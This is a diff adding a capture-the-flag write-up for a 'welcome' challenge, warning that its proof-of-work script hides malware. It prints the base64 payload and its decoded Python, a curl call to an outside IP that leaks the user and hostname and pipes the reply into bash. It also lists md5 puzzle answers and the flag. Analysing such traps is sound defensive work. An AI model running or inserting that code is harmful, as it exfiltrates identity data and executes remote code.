@@ -1,0 +1,48 @@
+welcome
+by mallory
+
+This year we added a Proof of Work to some of our challenges.
+
+Just run python pow.py <target>, were target is the value provided by the server and get the flag.
+
+pow
+
+nc welcome.insomnihack.ch 1337
+
+----------
+
+decode base64 string into python code
+
+Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8YmFzaCJpZiB4IT0ibnQiZWxzZSIvJVVTRVJOQU1FJUAlVVNFUkRPTUFJTiUiO29zLnN5c3RlbSgiY3VybCAtTnMgMzQuNjUuMTg3LjE0MS8iK3gp
+
+global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";os.system("curl -Ns 34.65.187.141/"+x)
+
+
+global i;
+i+=1337;
+x=os.name;
+x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";
+os.system("curl -Ns 34.65.187.141/"+x)
+
+
+this chunk of code will mess up the value of i by adding 1337 to it
+subtract 1337 to get the correct value
+fix by remove the binary string and exec call
+
+----------
+
+Give me an input whose md5sum starts with "d265ea" and get the flag ;)
+32850921
+
+
+               «Welcome to the wall of shame 2.0!» ~Mallory
+
+----------
+
+Give me an input whose md5sum starts with "173697" and get the flag ;)
+810818
+
+
+MITM are real: check SHA, check code, ...
+
+INS{Miss me with that fhisy line}
